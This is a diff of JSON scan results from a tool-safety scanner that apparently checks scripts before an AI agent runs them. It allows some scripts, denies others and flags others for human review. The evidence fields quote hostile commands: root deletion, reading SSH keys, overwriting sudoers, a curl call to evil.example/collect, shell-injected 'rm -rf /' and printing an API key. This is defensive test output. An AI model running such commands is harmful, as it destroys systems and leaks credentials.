@@ -1,10 +1,455 @@
 {
   "results": [
     {
+      "file": "safe_python.py",
+      "report": {
+        "decision": "allow",
+        "risk_level": "none",
+        "rule_id": "ALLOW-000",
+        "evidence": "analysis complete; no active policy finding",
+        "recommendation": "Execute with least privilege and runtime limits.",
+        "findings": [],
+        "duration_ms": 0.2459581010043621,
+        "sanitized": true,
+        "policy_version": "2",
+        "policy_api_version": "trpc-agent.io/tool-safety/v1",
+        "policy_id": "tool-safety-example",
+        "policy_relaxed": false,
+        "input_sha256": "5c1321a48a9702b4ea20e07ec0c4073d2dc706f8c7567457436710f290e0300d",
+        "analysis_complete": true,
+        "analysis_status": "complete",
+        "invocation_id": "scan-5c1321a48a9702b4",
+        "blocks_scanned": 1
+      }
+    },
+    {
+      "file": "safe_bash.sh",
+      "report": {
+        "decision": "allow",
+        "risk_level": "none",
+        "rule_id": "ALLOW-000",
+        "evidence": "analysis complete; no active policy finding",
+        "recommendation": "Execute with least privilege and runtime limits.",
+        "findings": [],
+        "duration_ms": 6.349958945065737,
+        "sanitized": true,
+        "policy_version": "2",
+        "policy_api_version": "trpc-agent.io/tool-safety/v1",
+        "policy_id": "tool-safety-example",
+        "policy_relaxed": false,
+        "input_sha256": "65631de205b2254b4c6edb5303622f149eb4f26d6136f14816fa83764424ec97",
+        "analysis_complete": true,
+        "analysis_status": "complete",
+        "invocation_id": "scan-65631de205b2254b",
+        "blocks_scanned": 1
+      }
+    },
+    {
+      "file": "safe_allowed_network.py",
+      "report": {
+        "decision": "allow",
+        "risk_level": "none",
+        "rule_id": "ALLOW-000",
+        "evidence": "analysis complete; no active policy finding",
+        "recommendation": "Execute with least privilege and runtime limits.",
+        "findings": [],
+        "duration_ms": 0.19087502732872963,
+        "sanitized": true,
+        "policy_version": "2",
+        "policy_api_version": "trpc-agent.io/tool-safety/v1",
+        "policy_id": "tool-safety-example",
+        "policy_relaxed": false,
+        "input_sha256": "20a3af3f537e259a4029ad9d184687e5820769d5d716a1df4365fa0927905a9c",
+        "analysis_complete": true,
+        "analysis_status": "complete",
+        "invocation_id": "scan-20a3af3f537e259a",
+        "blocks_scanned": 1
+      }
+    },
+    {
+      "file": "safe_allowed_network.sh",
+      "report": {
+        "decision": "allow",
+        "risk_level": "none",
+        "rule_id": "ALLOW-000",
+        "evidence": "analysis complete; no active policy finding",
+        "recommendation": "Execute with least privilege and runtime limits.",
+        "findings": [],
+        "duration_ms": 0.08829217404127121,
+        "sanitized": true,
+        "policy_version": "2",
+        "policy_api_version": "trpc-agent.io/tool-safety/v1",
+        "policy_id": "tool-safety-example",
+        "policy_relaxed": false,
+        "input_sha256": "58d65e7b302a9b6b28b75c7a26b1d842d7b38fae620882d758e8bf3a5c47d898",
+        "analysis_complete": true,
+        "analysis_status": "complete",
+        "invocation_id": "scan-58d65e7b302a9b6b",
+        "blocks_scanned": 1
+      }
+    },
+    {
+      "file": "safe_subprocess.py",
+      "report": {
+        "decision": "allow",
+        "risk_level": "none",
+        "rule_id": "ALLOW-000",
+        "evidence": "analysis complete; no active policy finding",
+        "recommendation": "Execute with least privilege and runtime limits.",
+        "findings": [],
+        "duration_ms": 0.17012516036629677,
+        "sanitized": true,
+        "policy_version": "2",
+        "policy_api_version": "trpc-agent.io/tool-safety/v1",
+        "policy_id": "tool-safety-example",
+        "policy_relaxed": false,
+        "input_sha256": "fec706268f3bb59eaed6acf1fbce38c59761ba7a11b7af1652ee5fb72a0c112b",
+        "analysis_complete": true,
+        "analysis_status": "complete",
+        "invocation_id": "scan-fec706268f3bb59e",
+        "blocks_scanned": 1
+      }
+    },
+    {
+      "file": "safe_env_present.py",
+      "report": {
+        "decision": "allow",
+        "risk_level": "none",
+        "rule_id": "ALLOW-000",
+        "evidence": "analysis complete; no active policy finding",
+        "recommendation": "Execute with least privilege and runtime limits.",
+        "findings": [],
+        "duration_ms": 0.07920805364847183,
+        "sanitized": true,
+        "policy_version": "2",
+        "policy_api_version": "trpc-agent.io/tool-safety/v1",
+        "policy_id": "tool-safety-example",
+        "policy_relaxed": false,
+        "input_sha256": "41f812544a7d023d6b8fcc1fe03c82457853b928e928f7e31188cb1766c11556",
+        "analysis_complete": true,
+        "analysis_status": "complete",
+        "invocation_id": "scan-41f812544a7d023d",
+        "blocks_scanned": 1
+      }
+    },
+    {
+      "file": "safe_loop.py",
+      "report": {
+        "decision": "allow",
+        "risk_level": "none",
+        "rule_id": "ALLOW-000",
+        "evidence": "analysis complete; no active policy finding",
+        "recommendation": "Execute with least privilege and runtime limits.",
+        "findings": [],
+        "duration_ms": 0.1315828412771225,
+        "sanitized": true,
+        "policy_version": "2",
+        "policy_api_version": "trpc-agent.io/tool-safety/v1",
+        "policy_id": "tool-safety-example",
+        "policy_relaxed": false,
+        "input_sha256": "3ce49033db11a562b2ad84587f93440af8df3534644a04df90dd9b2940352591",
+        "analysis_complete": true,
+        "analysis_status": "complete",
+        "invocation_id": "scan-3ce49033db11a562",
+        "blocks_scanned": 1
+      }
+    },
+    {
+      "file": "safe_sleep.py",
+      "report": {
+        "decision": "allow",
+        "risk_level": "none",
+        "rule_id": "ALLOW-000",
+        "evidence": "analysis complete; no active policy finding",
+        "recommendation": "Execute with least privilege and runtime limits.",
+        "findings": [],
+        "duration_ms": 0.10337494313716888,
+        "sanitized": true,
+        "policy_version": "2",
+        "policy_api_version": "trpc-agent.io/tool-safety/v1",
+        "policy_id": "tool-safety-example",
+        "policy_relaxed": false,
+        "input_sha256": "29c45b5bc6af381d5fccde208d1809e06d87efc96f8fc3d15db1cc1560597dc5",
+        "analysis_complete": true,
+        "analysis_status": "complete",
+        "invocation_id": "scan-29c45b5bc6af381d",
+        "blocks_scanned": 1
+      }
+    },
+    {
+      "file": "safe_relative_path.py",
+      "report": {
+        "decision": "allow",
+        "risk_level": "none",
+        "rule_id": "ALLOW-000",
+        "evidence": "analysis complete; no active policy finding",
+        "recommendation": "Execute with least privilege and runtime limits.",
+        "findings": [],
+        "duration_ms": 0.13183383271098137,
+        "sanitized": true,
+        "policy_version": "2",
+        "policy_api_version": "trpc-agent.io/tool-safety/v1",
+        "policy_id": "tool-safety-example",
+        "policy_relaxed": false,
+        "input_sha256": "4268fa62d749d7b2f4cfe0a2600203bde5d38121793ddb942ba2bf7eeb089e91",
+        "analysis_complete": true,
+        "analysis_status": "complete",
+        "invocation_id": "scan-4268fa62d749d7b2",
+        "blocks_scanned": 1
+      }
+    },
+    {
+      "file": "safe_tutorial.py",
+      "report": {
+        "decision": "allow",
+        "risk_level": "none",
+        "rule_id": "ALLOW-000",
+        "evidence": "analysis complete; no active policy finding",
+        "recommendation": "Execute with least privilege and runtime limits.",
+        "findings": [],
+        "duration_ms": 0.1127501018345356,
+        "sanitized": true,
+        "policy_version": "2",
+        "policy_api_version": "trpc-agent.io/tool-safety/v1",
+        "policy_id": "tool-safety-example",
+        "policy_relaxed": false,
+        "input_sha256": "c6e39d9d7e44e118f35c11b61f84f95c6acc341e2edb327374f978c34617a3f3",
+        "analysis_complete": true,
+        "analysis_status": "complete",
+        "invocation_id": "scan-c6e39d9d7e44e118",
+        "blocks_scanned": 1
+      }
+    },
+    {
+      "file": "risky_delete_root.sh",
+      "report": {
+        "decision": "deny",
+        "risk_level": "critical",
+        "rule_id": "FILE-001",
+        "evidence": "rm -rf /",
+        "recommendation": "Restrict deletion to an explicit disposable path inside the workspace.",
+        "findings": [
+          {
+            "rule_id": "FILE-001",
+            "category": "file",
+            "risk_level": "critical",
+            "action": "deny",
+            "message": "Dangerous deletion targets a protected or out-of-workspace path.",
+            "evidence": "rm -rf /",
+            "block_id": "block-0",
+            "line_number": null,
+            "column": null,
+            "recommendation": "Restrict deletion to an explicit disposable path inside the workspace."
+          }
+        ],
+        "duration_ms": 0.1321667805314064,
+        "sanitized": true,
+        "policy_version": "2",
+        "policy_api_version": "trpc-agent.io/tool-safety/v1",
+        "policy_id": "tool-safety-example",
+        "policy_relaxed": false,
+        "input_sha256": "8827ae1e8d82755810e55f2eaf2c22c7eb467f373ccd9db2693bfc46739419b6",
+        "analysis_complete": true,
+        "analysis_status": "complete",
+        "invocation_id": "scan-8827ae1e8d827558",
+        "blocks_scanned": 1
+      }
+    },
+    {
+      "file": "risky_delete_root.py",
+      "report": {
+        "decision": "deny",
+        "risk_level": "critical",
+        "rule_id": "FILE-001",
+        "evidence": "shutil.rmtree(\"/\")",
+        "recommendation": "Restrict deletion to an explicit disposable path inside the workspace.",
+        "findings": [
+          {
+            "rule_id": "FILE-001",
+            "category": "file",
+            "risk_level": "critical",
+            "action": "deny",
+            "message": "Dangerous deletion targets a protected or out-of-workspace path.",
+            "evidence": "shutil.rmtree(\"/\")",
+            "block_id": "block-0",
+            "line_number": 3,
+            "column": 0,
+            "recommendation": "Restrict deletion to an explicit disposable path inside the workspace."
+          }
+        ],
+        "duration_ms": 0.14308327808976173,
+        "sanitized": true,
+        "policy_version": "2",
+        "policy_api_version": "trpc-agent.io/tool-safety/v1",
+        "policy_id": "tool-safety-example",
+        "policy_relaxed": false,
+        "input_sha256": "232f5487f76f88623f2d5a675f0d8ade9cb31052203b45596aa8d59e8845bc22",
+        "analysis_complete": true,
+        "analysis_status": "complete",
+        "invocation_id": "scan-232f5487f76f8862",
+        "blocks_scanned": 1
+      }
+    },
+    {
+      "file": "review_delete_workspace.sh",
+      "report": {
+        "decision": "needs_human_review",
+        "risk_level": "high",
+        "rule_id": "FILE-002",
+        "evidence": "rm -rf ./build",
+        "recommendation": "Confirm the target is disposable and approve this invocation explicitly.",
+        "findings": [
+          {
+            "rule_id": "FILE-002",
+            "category": "file",
+            "risk_level": "high",
+            "action": "needs_human_review",
+            "message": "Recursive deletion inside the workspace requires approval.",
+            "evidence": "rm -rf ./build",
+            "block_id": "block-0",
+            "line_number": null,
+            "column": null,
+            "recommendation": "Confirm the target is disposable and approve this invocation explicitly."
+          }
+        ],
+        "duration_ms": 0.4970422014594078,
+        "sanitized": true,
+        "policy_version": "2",
+        "policy_api_version": "trpc-agent.io/tool-safety/v1",
+        "policy_id": "tool-safety-example",
+        "policy_relaxed": false,
+        "input_sha256": "9919edb1475f74c4d07366db889e97929bc29d05ca51a4339bab805dd4a84c75",
+        "analysis_complete": true,
+        "analysis_status": "complete",
+        "invocation_id": "scan-9919edb1475f74c4",
+        "blocks_scanned": 1
+      }
+    },
+    {
+      "file": "risky_read_ssh.py",
+      "report": {
+        "decision": "deny",
+        "risk_level": "critical",
+        "rule_id": "FILE-003",
+        "evidence": "Path(key_path).read_text()",
+        "recommendation": "Remove credential access or provide only the minimum required value through a secret manager.",
+        "findings": [
+          {
+            "rule_id": "FILE-003",
+            "category": "file",
+            "risk_level": "critical",
+            "action": "deny",
+            "message": "The script accesses a credential or sensitive configuration path.",
+            "evidence": "Path(key_path).read_text()",
+            "block_id": "block-0",
+            "line_number": 4,
+            "column": 14,
+            "recommendation": "Remove credential access or provide only the minimum required value through a secret manager."
+          }
+        ],
+        "duration_ms": 0.24466728791594505,
+        "sanitized": true,
+        "policy_version": "2",
+        "policy_api_version": "trpc-agent.io/tool-safety/v1",
+        "policy_id": "tool-safety-example",
+        "policy_relaxed": false,
+        "input_sha256": "5a5cd03a8a444660c72ebdd7f5d5358a0809bd4fcbd49a78e9fb2210068f9a75",
+        "analysis_complete": true,
+        "analysis_status": "complete",
+        "invocation_id": "scan-5a5cd03a8a444660",
+        "blocks_scanned": 1
+      }
+    },
+    {
+      "file": "risky_read_ssh.sh",
+      "report": {
+        "decision": "deny",
+        "risk_level": "critical",
+        "rule_id": "FILE-003",
+        "evidence": "cat ~/.ssh/id_rsa",
+        "recommendation": "Remove credential access or provide only the minimum required value through a secret manager.",
+        "findings": [
+          {
+            "rule_id": "FILE-003",
+            "category": "file",
+            "risk_level": "critical",
+            "action": "deny",
+            "message": "The script accesses a credential or sensitive configuration path.",
+            "evidence": "cat ~/.ssh/id_rsa",
+            "block_id": "block-0",
+            "line_number": null,
+            "column": null,
+            "recommendation": "Remove credential access or provide only the minimum required value through a secret manager."
+          }
+        ],
+        "duration_ms": 0.08558295667171478,
+        "sanitized": true,
+        "policy_version": "2",
+        "policy_api_version": "trpc-agent.io/tool-safety/v1",
+        "policy_id": "tool-safety-example",
+        "policy_relaxed": false,
+        "input_sha256": "5df7b257407596fc713cf12ff160b368127deafcdba27c96cc4c46a677e5da5c",
+        "analysis_complete": true,
+        "analysis_status": "complete",
+        "invocation_id": "scan-5df7b257407596fc",
+        "blocks_scanned": 1
+      }
+    },
+    {
+      "file": "risky_overwrite_system.py",
+      "report": {
+        "decision": "deny",
+        "risk_level": "critical",
+        "rule_id": "FILE-004",
+        "evidence": "open(\"/etc/sudoers\", \"w\", encoding=\"utf-8\")",
+        "recommendation": "Write only to an explicit path inside the workspace.",
+        "findings": [
+          {
+            "rule_id": "FILE-004",
+            "category": "file",
+            "risk_level": "critical",
+            "action": "deny",
+            "message": "The script may overwrite a protected system or credential path.",
+            "evidence": "open(\"/etc/sudoers\", \"w\", encoding=\"utf-8\")",
+            "block_id": "block-0",
+            "line_number": 1,
+            "column": 5,
+            "recommendation": "Write only to an explicit path inside the workspace."
+          },
+          {
+            "rule_id": "PROC-UNKNOWN-001",
+            "category": "process",
+            "risk_level": "high",
+            "action": "needs_human_review",
+            "message": "The analyzer found a possible external side effect that it cannot model safely.",
+            "evidence": "stream.write(\"unsafe\")",
+            "block_id": "block-0",
+            "line_number": 2,
+            "column": 4,
+            "recommendation": "Use a supported explicit operation or require sandboxed human review."
+          }
+        ],
+        "duration_ms": 0.45120902359485626,
+        "sanitized": true,
+        "policy_version": "2",
+        "policy_api_version": "trpc-agent.io/tool-safety/v1",
+        "policy_id": "tool-safety-example",
+        "policy_relaxed": false,
+        "input_sha256": "510bacbc5dfe35065b5e2629cf06d4ab671a1bc149f976ebef4154aaa6c62fb9",
+        "analysis_complete": false,
+        "analysis_status": "unsupported",
+        "invocation_id": "scan-510bacbc5dfe3506",
+        "blocks_scanned": 1
+      }
+    },
+    {
       "file": "risky_network.py",
       "report": {
         "decision": "deny",
         "risk_level": "high",
+        "rule_id": "NET-001",
+        "evidence": "requests.Session().get(url=\"https://evil.example/collect\")",
+        "recommendation": "Add a reviewed hostname to the policy allowlist or remove the outbound request.",
         "findings": [
           {
             "rule_id": "NET-001",
@@ -12,16 +457,481 @@
             "risk_level": "high",
             "action": "deny",
             "message": "The script connects to a domain that is not allowlisted.",
-            "evidence": "requests.get(\"https://evil.example/collect\")",
+            "evidence": "requests.Session().get(url=\"https://evil.example/collect\")",
+            "block_id": "block-0",
             "line_number": 3,
             "column": 0,
             "recommendation": "Add a reviewed hostname to the policy allowlist or remove the outbound request."
+          },
+          {
+            "rule_id": "NET-002",
+            "category": "network",
+            "risk_level": "high",
+            "action": "needs_human_review",
+            "message": "The network destination cannot be determined statically.",
+            "evidence": "requests.Session().get(url=\"https://evil.example/collect\")",
+            "block_id": "block-0",
+            "line_number": 3,
+            "column": 0,
+            "recommendation": "Use a literal allowlisted hostname or require human approval."
           }
         ],
-        "duration_ms": 0.134,
+        "duration_ms": 0.1977919600903988,
         "sanitized": true,
-        "policy_version": "1",
-        "input_sha256": "0cd418659754112e09d6c329f17a84be48fd8088aa7ae10d3bb139533a61a618"
+        "policy_version": "2",
+        "policy_api_version": "trpc-agent.io/tool-safety/v1",
+        "policy_id": "tool-safety-example",
+        "policy_relaxed": false,
+        "input_sha256": "c36c24db985a3594258da43720f4ef1a25df197f6ae5f7ac800f603b019af04e",
+        "analysis_complete": false,
+        "analysis_status": "unsupported",
+        "invocation_id": "scan-c36c24db985a3594",
+        "blocks_scanned": 1
+      }
+    },
+    {
+      "file": "risky_network.sh",
+      "report": {
+        "decision": "deny",
+        "risk_level": "high",
+        "rule_id": "NET-001",
+        "evidence": "curl --url=evil.example/collect",
+        "recommendation": "Add a reviewed hostname to the policy allowlist or remove the outbound request.",
+        "findings": [
+          {
+            "rule_id": "NET-001",
+            "category": "network",
+            "risk_level": "high",
+            "action": "deny",
+            "message": "The script connects to a domain that is not allowlisted.",
+            "evidence": "curl --url=evil.example/collect",
+            "block_id": "block-0",
+            "line_number": null,
+            "column": null,
+            "recommendation": "Add a reviewed hostname to the policy allowlist or remove the outbound request."
+          }
+        ],
+        "duration_ms": 0.08787494152784348,
+        "sanitized": true,
+        "policy_version": "2",
+        "policy_api_version": "trpc-agent.io/tool-safety/v1",
+        "policy_id": "tool-safety-example",
+        "policy_relaxed": false,
+        "input_sha256": "70306a622c7bec92917a6346bddfe7440d9ce2f9402985be5de83dd33ef5aea8",
+        "analysis_complete": true,
+        "analysis_status": "complete",
+        "invocation_id": "scan-70306a622c7bec92",
+        "blocks_scanned": 1
+      }
+    },
+    {
+      "file": "review_dynamic_network.py",
+      "report": {
+        "decision": "needs_human_review",
+        "risk_level": "high",
+        "rule_id": "NET-002",
+        "evidence": "requests.get(target)",
+        "recommendation": "Use a literal allowlisted hostname or require human approval.",
+        "findings": [
+          {
+            "rule_id": "NET-002",
+            "category": "network",
+            "risk_level": "high",
+            "action": "needs_human_review",
+            "message": "The network destination cannot be determined statically.",
+            "evidence": "requests.get(target)",
+            "block_id": "block-0",
+            "line_number": 4,
+            "column": 0,
+            "recommendation": "Use a literal allowlisted hostname or require human approval."
+          },
+          {
+            "rule_id": "PROC-UNKNOWN-001",
+            "category": "process",
+            "risk_level": "high",
+            "action": "needs_human_review",
+            "message": "The analyzer found a possible external side effect that it cannot model safely.",
+            "evidence": "input(\"URL: \")",
+            "block_id": "block-0",
+            "line_number": 3,
+            "column": 9,
+            "recommendation": "Use a supported explicit operation or require sandboxed human review."
+          }
+        ],
+        "duration_ms": 0.1949160359799862,
+        "sanitized": true,
+        "policy_version": "2",
+        "policy_api_version": "trpc-agent.io/tool-safety/v1",
+        "policy_id": "tool-safety-example",
+        "policy_relaxed": false,
+        "input_sha256": "79bb2ce0cb136ede80f801a257f061ce033a15be0accaba43ada252d5a6ba513",
+        "analysis_complete": false,
+        "analysis_status": "unsupported",
+        "invocation_id": "scan-79bb2ce0cb136ede",
+        "blocks_scanned": 1
+      }
+    },
+    {
+      "file": "risky_shell_injection.py",
+      "report": {
+        "decision": "deny",
+        "risk_level": "critical",
+        "rule_id": "PROC-001",
+        "evidence": "subprocess.run(\"echo ok; rm -rf /\", shell=True)",
+        "recommendation": "Use a direct argument list with shell disabled and remove privileged execution.",
+        "findings": [
+          {
+            "rule_id": "PROC-001",
+            "category": "process",
+            "risk_level": "critical",
+            "action": "deny",
+            "message": "The script uses a shell, command substitution, dynamic execution, or privilege escalation.",
+            "evidence": "subprocess.run(\"echo ok; rm -rf /\", shell=True)",
+            "block_id": "block-0",
+            "line_number": 3,
+            "column": 0,
+            "recommendation": "Use a direct argument list with shell disabled and remove privileged execution."
+          }
+        ],
+        "duration_ms": 0.15424983575940132,
+        "sanitized": true,
+        "policy_version": "2",
+        "policy_api_version": "trpc-agent.io/tool-safety/v1",
+        "policy_id": "tool-safety-example",
+        "policy_relaxed": false,
+        "input_sha256": "a33cbfa77b0c871a4c4c579292b8ac4b5ce480024301d7c47e02abc0278a1694",
+        "analysis_complete": true,
+        "analysis_status": "complete",
+        "invocation_id": "scan-a33cbfa77b0c871a",
+        "blocks_scanned": 1
+      }
+    },
+    {
+      "file": "risky_unallowed_command.sh",
+      "report": {
+        "decision": "deny",
+        "risk_level": "high",
+        "rule_id": "PROC-002",
+        "evidence": "python --version",
+        "recommendation": "Use an allowlisted command or update the reviewed command policy.",
+        "findings": [
+          {
+            "rule_id": "PROC-002",
+            "category": "process",
+            "risk_level": "high",
+            "action": "deny",
+            "message": "The script invokes a command that is not allowlisted.",
+            "evidence": "python --version",
+            "block_id": "block-0",
+            "line_number": null,
+            "column": null,
+            "recommendation": "Use an allowlisted command or update the reviewed command policy."
+          },
+          {
+            "rule_id": "PROC-UNKNOWN-001",
+            "category": "process",
+            "risk_level": "high",
+            "action": "needs_human_review",
+            "message": "The analyzer found a possible external side effect that it cannot model safely.",
+            "evidence": "python --version",
+            "block_id": "block-0",
+            "line_number": null,
+            "column": null,
+            "recommendation": "Use a supported explicit operation or require sandboxed human review."
+          }
+        ],
+        "duration_ms": 0.060582999140024185,
+        "sanitized": true,
+        "policy_version": "2",
+        "policy_api_version": "trpc-agent.io/tool-safety/v1",
+        "policy_id": "tool-safety-example",
+        "policy_relaxed": false,
+        "input_sha256": "3d61738aa070019165541416f2c2145668e6526add477d883f125a121c10defc",
+        "analysis_complete": false,
+        "analysis_status": "unsupported",
+        "invocation_id": "scan-3d61738aa0700191",
+        "blocks_scanned": 1
+      }
+    },
+    {
+      "file": "review_dynamic_command.py",
+      "report": {
+        "decision": "needs_human_review",
+        "risk_level": "high",
+        "rule_id": "PROC-003",
+        "evidence": "subprocess.run(command)",
+        "recommendation": "Use a literal argument list or require human approval.",
+        "findings": [
+          {
+            "rule_id": "PROC-003",
+            "category": "process",
+            "risk_level": "high",
+            "action": "needs_human_review",
+            "message": "The command is built dynamically and cannot be verified.",
+            "evidence": "subprocess.run(command)",
+            "block_id": "block-0",
+            "line_number": 4,
+            "column": 0,
+            "recommendation": "Use a literal argument list or require human approval."
+          },
+          {
+            "rule_id": "PROC-UNKNOWN-001",
+            "category": "process",
+            "risk_level": "high",
+            "action": "needs_human_review",
+            "message": "The analyzer found a possible external side effect that it cannot model safely.",
+            "evidence": "input(\"Command: \")",
+            "block_id": "block-0",
+            "line_number": 3,
+            "column": 10,
+            "recommendation": "Use a supported explicit operation or require sandboxed human review."
+          }
+        ],
+        "duration_ms": 0.1848749816417694,
+        "sanitized": true,
+        "policy_version": "2",
+        "policy_api_version": "trpc-agent.io/tool-safety/v1",
+        "policy_id": "tool-safety-example",
+        "policy_relaxed": false,
+        "input_sha256": "28dc7a55671d53d29ded8130add1ff6965d07fb3b5c8c482044d861235ec91eb",
+        "analysis_complete": false,
+        "analysis_status": "unsupported",
+        "invocation_id": "scan-28dc7a55671d53d2",
+        "blocks_scanned": 1
+      }
+    },
+    {
+      "file": "review_background.sh",
+      "report": {
+        "decision": "needs_human_review",
+        "risk_level": "high",
+        "rule_id": "PROC-004",
+        "evidence": "background process",
+        "recommendation": "Run the process in the foreground with an explicit timeout or require approval.",
+        "findings": [
+          {
+            "rule_id": "PROC-004",
+            "category": "process",
+            "risk_level": "high",
+            "action": "needs_human_review",
+            "message": "The script starts a background process.",
+            "evidence": "background process",
+            "block_id": "block-0",
+            "line_number": null,
+            "column": null,
+            "recommendation": "Run the process in the foreground with an explicit timeout or require approval."
+          }
+        ],
+        "duration_ms": 0.05470821633934975,
+        "sanitized": true,
+        "policy_version": "2",
+        "policy_api_version": "trpc-agent.io/tool-safety/v1",
+        "policy_id": "tool-safety-example",
+        "policy_relaxed": false,
+        "input_sha256": "a7e59dc54eaba3abc3e7c3fea9884668ac4e0acb361098fe79a5f2a9952a8c73",
+        "analysis_complete": true,
+        "analysis_status": "complete",
+        "invocation_id": "scan-a7e59dc54eaba3ab",
+        "blocks_scanned": 1
+      }
+    },
+    {
+      "file": "review_dependency.py",
+      "report": {
+        "decision": "needs_human_review",
+        "risk_level": "medium",
+        "rule_id": "DEP-001",
+        "evidence": "pip install unreviewed-package",
+        "recommendation": "Pin and review the dependency, then approve the installation explicitly.",
+        "findings": [
+          {
+            "rule_id": "DEP-001",
+            "category": "dependency",
+            "risk_level": "medium",
+            "action": "needs_human_review",
+            "message": "The script changes installed dependencies or the host environment.",
+            "evidence": "pip install unreviewed-package",
+            "block_id": "block-0",
+            "line_number": null,
+            "column": null,
+            "recommendation": "Pin and review the dependency, then approve the installation explicitly."
+          },
+          {
+            "rule_id": "DEP-001",
+            "category": "dependency",
+            "risk_level": "medium",
+            "action": "needs_human_review",
+            "message": "The script changes installed dependencies or the host environment.",
+            "evidence": "subprocess.run([\"pip\", \"install\", \"unreviewed-package\"])",
+            "block_id": "block-0",
+            "line_number": 3,
+            "column": 0,
+            "recommendation": "Pin and review the dependency, then approve the installation explicitly."
+          }
+        ],
+        "duration_ms": 0.16758311539888382,
+        "sanitized": true,
+        "policy_version": "2",
+        "policy_api_version": "trpc-agent.io/tool-safety/v1",
+        "policy_id": "tool-safety-example",
+        "policy_relaxed": false,
+        "input_sha256": "3c593d80bfd95b014dbd84ec061082ff22cb4e436f4434e5fa6c3c2115463a13",
+        "analysis_complete": true,
+        "analysis_status": "complete",
+        "invocation_id": "scan-3c593d80bfd95b01",
+        "blocks_scanned": 1
+      }
+    },
+    {
+      "file": "risky_fork_bomb.sh",
+      "report": {
+        "decision": "deny",
+        "risk_level": "critical",
+        "rule_id": "RES-001",
+        "evidence": "recursive process fan-out",
+        "recommendation": "Remove recursive process creation and enforce runtime PID limits.",
+        "findings": [
+          {
+            "rule_id": "RES-001",
+            "category": "resource",
+            "risk_level": "critical",
+            "action": "deny",
+            "message": "A fork-bomb pattern can exhaust process resources.",
+            "evidence": "recursive process fan-out",
+            "block_id": "block-0",
+            "line_number": null,
+            "column": null,
+            "recommendation": "Remove recursive process creation and enforce runtime PID limits."
+          },
+          {
+            "rule_id": "PROC-004",
+            "category": "process",
+            "risk_level": "high",
+            "action": "needs_human_review",
+            "message": "The script starts a background process.",
+            "evidence": "background process",
+            "block_id": "block-0",
+            "line_number": null,
+            "column": null,
+            "recommendation": "Run the process in the foreground with an explicit timeout or require approval."
+          }
+        ],
+        "duration_ms": 0.13999966904520988,
+        "sanitized": true,
+        "policy_version": "2",
+        "policy_api_version": "trpc-agent.io/tool-safety/v1",
+        "policy_id": "tool-safety-example",
+        "policy_relaxed": false,
+        "input_sha256": "05fc0435a3677e591b7f7d958e4d35b409ad0f4849237077b541edf261e6316a",
+        "analysis_complete": true,
+        "analysis_status": "complete",
+        "invocation_id": "scan-05fc0435a3677e59",
+        "blocks_scanned": 1
+      }
+    },
+    {
+      "file": "review_infinite_loop.py",
+      "report": {
+        "decision": "needs_human_review",
+        "risk_level": "medium",
+        "rule_id": "RES-002",
+        "evidence": "while 1:     pass",
+        "recommendation": "Add a finite bound below the configured limit or require approval.",
+        "findings": [
+          {
+            "rule_id": "RES-002",
+            "category": "resource",
+            "risk_level": "medium",
+            "action": "needs_human_review",
+            "message": "The script may consume excessive time or concurrency.",
+            "evidence": "while 1:     pass",
+            "block_id": "block-0",
+            "line_number": 1,
+            "column": 0,
+            "recommendation": "Add a finite bound below the configured limit or require approval."
+          }
+        ],
+        "duration_ms": 0.06154179573059082,
+        "sanitized": true,
+        "policy_version": "2",
+        "policy_api_version": "trpc-agent.io/tool-safety/v1",
+        "policy_id": "tool-safety-example",
+        "policy_relaxed": false,
+        "input_sha256": "44b658e674e3cc07b99793719251aea67cae15f41cf9a735bed8ff9d07871b13",
+        "analysis_complete": true,
+        "analysis_status": "complete",
+        "invocation_id": "scan-44b658e674e3cc07",
+        "blocks_scanned": 1
+      }
+    },
+    {
+      "file": "risky_huge_write.py",
+      "report": {
+        "decision": "deny",
+        "risk_level": "high",
+        "rule_id": "RES-003",
+        "evidence": "Path(\"huge.bin\").write_text(\"x\" * 200000000)",
+        "recommendation": "Reduce the write size and enforce a runtime disk quota.",
+        "findings": [
+          {
+            "rule_id": "RES-003",
+            "category": "resource",
+            "risk_level": "high",
+            "action": "deny",
+            "message": "A statically identifiable write exceeds the configured size limit.",
+            "evidence": "Path(\"huge.bin\").write_text(\"x\" * 200000000)",
+            "block_id": "block-0",
+            "line_number": 3,
+            "column": 0,
+            "recommendation": "Reduce the write size and enforce a runtime disk quota."
+          }
+        ],
+        "duration_ms": 0.5249171517789364,
+        "sanitized": true,
+        "policy_version": "2",
+        "policy_api_version": "trpc-agent.io/tool-safety/v1",
+        "policy_id": "tool-safety-example",
+        "policy_relaxed": false,
+        "input_sha256": "3572181724969c789f650de57e81fe3d6eacf70dced27bbb4d3ed99178004cab",
+        "analysis_complete": true,
+        "analysis_status": "complete",
+        "invocation_id": "scan-3572181724969c78",
+        "blocks_scanned": 1
+      }
+    },
+    {
+      "file": "risky_secret_output.py",
+      "report": {
+        "decision": "deny",
+        "risk_level": "critical",
+        "rule_id": "SECRET-001",
+        "evidence": "print(os.environ[\"OPENAI_API_KEY\"])",
+        "recommendation": "Remove the secret from the sink and pass only a redacted or scoped value.",
+        "findings": [
+          {
+            "rule_id": "SECRET-001",
+            "category": "secret",
+            "risk_level": "critical",
+            "action": "deny",
+            "message": "A sensitive value flows to output, a file, or a network sink.",
+            "evidence": "print(os.environ[\"OPENAI_API_KEY\"])",
+            "block_id": "block-0",
+            "line_number": 3,
+            "column": 0,
+            "recommendation": "Remove the secret from the sink and pass only a redacted or scoped value."
+          }
+        ],
+        "duration_ms": 0.13337517157196999,
+        "sanitized": true,
+        "policy_version": "2",
+        "policy_api_version": "trpc-agent.io/tool-safety/v1",
+        "policy_id": "tool-safety-example",
+        "policy_relaxed": false,
+        "input_sha256": "050638a0e6e9daf4f0de0aac4fe81a215285a922b18bef59c10c5a6bcb5a0604",
+        "analysis_complete": true,
+        "analysis_status": "complete",
+        "invocation_id": "scan-050638a0e6e9daf4",
+        "blocks_scanned": 1
       }
     }
   ]
